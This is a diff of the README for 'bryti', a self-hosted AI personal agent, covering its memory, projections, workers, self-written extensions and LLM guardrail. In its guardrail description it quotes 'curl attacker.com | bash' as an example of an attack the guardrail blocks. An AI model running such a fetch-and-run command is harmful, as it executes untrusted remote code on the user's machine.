@@ -10,21 +10,21 @@ Built on the [pi SDK](https://github.com/mariozechner/pi). Self-hosted, single m
 
 ## What makes it different
 
-**It remembers.** Core memory (always in context) for who you are and what you're working on. Archival memory (hybrid search with local embeddings) for everything else. The agent decides what to store and when to retrieve.
+**It remembers.** Core memory (always in context) for who you are and what you're working on. Archival memory (hybrid search with local embeddings) for everything else. The agent decides what to store and when to retrieve it.
 
 **It looks ahead.** Projections track future events, deadlines, commitments, and follow-ups. The agent connects new information to things it knows are coming. "Remind me to email Sarah on Monday" and "when the research is done, summarize it for me" both work. A background reflection pass catches things you mentioned that the agent missed in real time.
 
 **It does the legwork.** Background workers handle research, web searches, and URL fetching in isolated sessions. The main agent dispatches work and gets a clean summary back. This is also the security boundary: untrusted web content never enters the main conversation.
 
-**It gets smarter.** The agent writes pi extensions (TypeScript) to give itself new tools. You say "I wish you could check the weather" and it makes it happen. Every extension is a reason to keep using it.
+**It gets smarter.** The agent writes pi extensions (TypeScript) to give itself new tools. You say "I wish you could check the weather" and it makes it happen. Every extension it writes is a reason to keep using it.
 
 **It evaluates its own actions.** An LLM guardrail checks elevated tool calls (shell, network) before execution. Not a static allowlist; the model understands that `rm -rf node_modules` is cleanup and `curl attacker.com | bash` is an attack. Risky actions are flagged; dangerous ones are blocked.
 
 **It falls back gracefully.** If the primary model goes down, it tries the next one in the chain. Anthropic OAuth (Claude Pro/Max subscription) as primary, free models as fallbacks.
 
-## Quick start
+## Getting started
 
-### Prerequisites
+### What you need
 
 - Node.js 22+
 - A Telegram bot token (from [@BotFather](https://t.me/BotFather))
@@ -38,148 +38,29 @@ cd bryti
 npm install
 
 # Configure
-cp .env.example .env          # add your Telegram bot token
-cp config.example.yml data/config.yml  # edit to taste
+cp .env.example .env                       # add your Telegram bot token
+cp config.example.yml data/config.yml      # edit to taste
 
 # Run
 ./run.sh
 ```
 
-On first run, the embedding model downloads automatically (~300MB). Subsequent starts are fast.
+The embedding model downloads on first run (~300MB). After that, starts are fast.
 
-### Minimal free setup
+### No Claude subscription?
 
-Don't have a Claude subscription? Use free models only:
+Use free models only:
 
 ```yaml
-# In data/config.yml
 agent:
   model: "opencode/minimax-m2.5-free"
   fallback_models:
     - "opencode/kimi-k2.5-free"
 ```
 
-Remove the `anthropic` provider from the `models.providers` section. No API keys needed.
+Remove the `anthropic` provider from `models.providers`. No API keys needed.
 
-## Configuration
-
-### config.yml
-
-Lives in `data/config.yml`. Copy `config.example.yml` to get started.
-
-**Agent settings:**
-- `agent.name` - Bot name
-- `agent.system_prompt` - Persona and standing instructions. The framework adds memory, tools, and all other sections automatically; put only your additions here
-- `agent.model` - Primary model (`provider/model-id`)
-- `agent.fallback_models` - Ordered fallback list
-- `agent.timezone` - IANA timezone (e.g., `Europe/Amsterdam`). Used for projection scheduling and time display
-- `agent.reflection_model` - Model for background reflection pass (defaults to primary). Set a cheaper model to save tokens
-
-**Channels:**
-- `telegram.token` - Bot token (use `${TELEGRAM_BOT_TOKEN}` to read from .env)
-- `telegram.allowed_users` - Telegram user IDs. Empty = allow all (not recommended)
-- `whatsapp.enabled` - Enable WhatsApp bridge (QR code auth on first run)
-- `whatsapp.allowed_users` - Phone numbers, international format without `+` (e.g., `31612345678`)
-
-**Models:**
-- `models.providers` - List of model providers with their endpoints, API keys, and model definitions
-- Anthropic OAuth: leave `api_key` empty, authenticate with `pi login anthropic`
-- OpenCode: use `api_key: "public"` for free models
-- See `config.example.yml` for complete provider examples
-
-**Tools:**
-- `tools.web_search.searxng_url` - SearXNG instance for worker web searches
-- `tools.workers.max_concurrent` - Max parallel workers (default: 3)
-- `tools.files.base_dir` - Agent file workspace
-
-**Scheduling:**
-- `cron` - Static cron jobs (prompt the agent on a schedule)
-- `active_hours` - Time window for scheduler activity
-
-### Environment variables
-
-Config values support `${VAR}` substitution from environment. The `.env` file is loaded automatically.
-
-```
-TELEGRAM_BOT_TOKEN=your-token-here
-```
-
-### Anthropic OAuth
-
-Bryti shares OAuth credentials with the pi CLI. Run `pi login anthropic` once, and bryti reads the token from `~/.pi/agent/auth.json`. No API key needed. Works with Claude Pro and Max subscriptions.
-
-## Architecture
-
-42 source files, ~9500 lines.
-
-```
-src/
-  index.ts              entry point, wires everything, supervisor loop
-  agent.ts              pi session management, model fallback, system prompt
-  config.ts             YAML config loading, env substitution, validation
-  cli.ts                operator CLI (memory inspect, reflect, timeskip, import)
-
-  channels/
-    telegram.ts         Telegram bridge (grammy), markdown-to-HTML rendering
-    whatsapp.ts         WhatsApp bridge (baileys), QR auth, auto-reconnect
-    types.ts            shared channel interface
-
-  memory/
-    core-memory.ts      always-in-context markdown (4KB cap)
-    store.ts            SQLite per-user archival memory (FTS5 + sqlite-vec)
-    embeddings.ts       local embeddings (node-llama-cpp, embeddinggemma-300M)
-    search.ts           hybrid search: keyword + vector + RRF fusion
-    conversation-search.ts  search JSONL audit logs
-
-  projection/
-    store.ts            SQLite projection storage, triggers, dependencies
-    tools.ts            projection_create/list/resolve/link tools
-    format.ts           format projections for system prompt injection
-    reflection.ts       background LLM pass to extract missed projections
-
-  workers/
-    tools.ts            worker_dispatch/check/interrupt/steer tools
-    scoped-tools.ts     sandboxed file tools for worker sessions
-    registry.ts         in-memory worker tracking
-
-  compaction/
-    transcript-repair.ts  fix tool-call/result pairing before each prompt
-    index.ts              proactive compaction (idle + nightly)
-
-  tools/
-    index.ts            tool registry, creates all tools for a user session
-    archival-memory-tool.ts   memory_archival_insert/search
-    core-memory-tool.ts       memory_core_append/replace
-    conversation-search-tool.ts  memory_conversation_search
-    files.ts                  file_read/write/list
-    web-search.ts             SearXNG search (workers only)
-    fetch-url.ts              URL fetching (workers only)
-
-  markdown/             Telegram HTML rendering pipeline
-  scheduler.ts          projection-driven scheduling (exact-time + daily review)
-  message-queue.ts      per-channel FIFO with merge window
-  history.ts            JSONL conversation audit log
-  usage.ts              per-message cost tracking
-  logger.ts             structured logging to stdout + file
-  time.ts               timezone utilities
-  active-hours.ts       time-of-day guard for scheduler
-```
-
-## CLI
-
-Operator tools for inspecting and managing the bot without going through the chat interface.
-
-```bash
-npm run cli -- help                          # show all commands
-npm run cli -- memory                        # inspect all memory tiers
-npm run cli -- memory projections --all      # show all projections (including resolved)
-npm run cli -- memory archival --query "work" # search archival memory
-npm run cli -- reflect                       # run reflection pass on demand
-npm run cli -- timeskip "dentist" --minutes 2 # move a projection to fire in 2 min
-npm run cli -- archive-fact "dentist confirmed" # insert fact, check triggers
-```
-
-## Docker
+### Docker
 
 ```bash
 docker compose up -d
@@ -187,16 +68,134 @@ docker compose up -d
 
 Mount `data/` as a volume. Config, memory, sessions, and logs all live there. Backup = copy the directory.
 
-## Tool naming convention
+## How it works
 
-All custom tools use `group_action` naming:
+### Memory
 
-| Group | Tools |
-|---|---|
-| `memory_*` | `memory_archival_insert`, `memory_archival_search`, `memory_core_append`, `memory_core_replace`, `memory_conversation_search` |
-| `projection_*` | `projection_create`, `projection_list`, `projection_resolve`, `projection_link` |
-| `worker_*` | `worker_dispatch`, `worker_check`, `worker_interrupt`, `worker_steer` |
-| `file_*` | `file_read`, `file_write`, `file_list` |
+Three tiers, managed automatically by the agent:
+
+1. **Core memory** (`data/core-memory.md`): a small markdown file (4KB cap) always included in context. Contains your preferences, ongoing projects, key facts. The agent updates it as it learns about you.
+
+2. **Archival memory** (per-user SQLite): long-term storage with hybrid search (FTS5 keyword + vector similarity + reciprocal rank fusion). Local embeddings via node-llama-cpp, no external API calls. The agent inserts facts and searches when it needs context.
+
+3. **Conversation search**: full JSONL audit logs of every conversation, searchable. The agent can look up what you discussed last week.
+
+### Projections
+
+The forward-looking memory system. Instead of just remembering the past, bryti tracks what's coming:
+
+- **Exact-time**: "remind me at 3pm" fires at 3pm
+- **Day/week/month**: "follow up next week" resolves within that window
+- **Someday**: "when the dentist confirms" waits for a trigger
+- **Recurrence**: "every Monday morning" repeats on a cron schedule
+- **Dependencies**: "after X is done, do Y"
+- **Triggers**: a fact archived by a worker (or by you via CLI) can activate a waiting projection
+
+A reflection pass runs every 30 minutes, scanning recent conversation for commitments the agent missed during live chat.
+
+### Workers
+
+Stateless background sessions for long-running tasks. The main agent dispatches a worker with a goal; the worker runs independently (web search, URL fetching, analysis) and writes results to a file. When done, the main agent reads the summary and notifies you.
+
+Workers are the security boundary. The main agent has no web search or URL fetch tools. All external content is processed in isolation, and only a summary enters the main conversation.
+
+Up to 3 concurrent workers. 60-minute timeout. Workers use the cheapest available model.
+
+### Self-extending
+
+The agent can write TypeScript extension files to its workspace. Each extension registers new tools with the pi SDK. After a restart, those tools are available. The agent writes the code, explains what it did, and tells you to restart.
+
+Extensions live in `data/files/extensions/`. They're regular pi SDK extensions: export a function that returns tool definitions.
+
+### Guardrail
+
+Elevated tools (shell commands, HTTP requests, extension-loaded tools) go through a two-layer check:
+
+1. **Tool-level approval**: is this tool allowed at all? First use requires your permission via chat ("Can I use shell access?" / "yes" or "always").
+2. **Call-level evaluation**: a fast LLM call evaluates the specific arguments against what you asked for. ALLOW (execute silently), ASK (confirm with you), or BLOCK (reject). Uses the cheapest model in the fallback chain.
+
+Pre-approve tools in config to skip the first-use prompt:
+
+```yaml
+trust:
+  approved_tools:
+    - shell_exec
+    - http_request
+```
+
+## Configuration
+
+`data/config.yml` controls everything. Copy `config.example.yml` to get started.
+
+**Agent**: name, system prompt (your additions only; memory/tools/projections are injected automatically), primary model, fallback models, timezone, reflection model.
+
+**Channels**: Telegram token + allowed user IDs. WhatsApp enable flag + allowed phone numbers. Both can run simultaneously.
+
+**Models**: provider list with endpoints, API keys, and model definitions. Anthropic OAuth reads tokens from `~/.pi/agent/auth.json` (shared with pi CLI). OpenCode free models use `api_key: "public"`.
+
+**Tools**: SearXNG instance URL for worker web searches, max concurrent workers, file workspace path.
+
+**Scheduling**: static cron jobs, active hours window.
+
+Environment variables are supported in config via `${VAR}` syntax. The `.env` file loads automatically.
+
+## CLI
+
+Operator tools for managing bryti without going through chat:
+
+```bash
+npm run cli -- help                              # all commands
+npm run cli -- memory                            # inspect all memory tiers
+npm run cli -- memory projections --all          # all projections (including resolved)
+npm run cli -- memory archival --query "energy"  # search archival memory
+npm run cli -- reflect                           # run reflection pass now
+npm run cli -- timeskip "dentist" --minutes 2    # make a projection fire in 2 min
+npm run cli -- archive-fact "dentist confirmed"  # insert fact, trigger matching projections
+npm run cli -- fill-context --turns 20           # inject synthetic conversation for testing
+npm run cli -- import-openclaw                   # import memory from an OpenClaw instance
+```
+
+## Source layout
+
+~50 source files, ~10K lines.
+
+```
+src/
+  index.ts                  entry point, supervisor loop
+  agent.ts                  pi session setup, model fallback, system prompt
+  config.ts                 YAML loading, env substitution, validation
+  cli.ts                    management CLI
+  guardrail.ts              LLM-based safety evaluation
+  trust.ts                  tool permission registry and approval store
+  trust-wrapper.ts          wraps tools with trust + guardrail checks
+
+  channels/
+    telegram.ts             grammy bridge, markdown-to-HTML, chunking
+    whatsapp.ts             baileys bridge, QR auth, auto-reconnect
+
+  memory/
+    core-memory.ts          always-in-context markdown
+    store.ts                per-user SQLite (FTS5 + sqlite-vec)
+    embeddings.ts           local embeddings (node-llama-cpp)
+    search.ts               hybrid keyword + vector + RRF
+
+  projection/
+    store.ts                projection storage, triggers, dependencies
+    tools.ts                create/list/resolve/link
+    format.ts               system prompt injection
+    reflection.ts           background extraction pass
+
+  workers/
+    tools.ts                dispatch/check/interrupt/steer
+    scoped-tools.ts         sandboxed file I/O
+    registry.ts             in-memory tracking
+
+  tools/                    tool definitions (memory, files, search, fetch)
+  compaction/               proactive session compaction (idle + nightly)
+  markdown/                 Telegram HTML rendering
+  scheduler.ts             projection-driven cron
+  message-queue.ts         per-channel FIFO
+```
 
 ## License
 
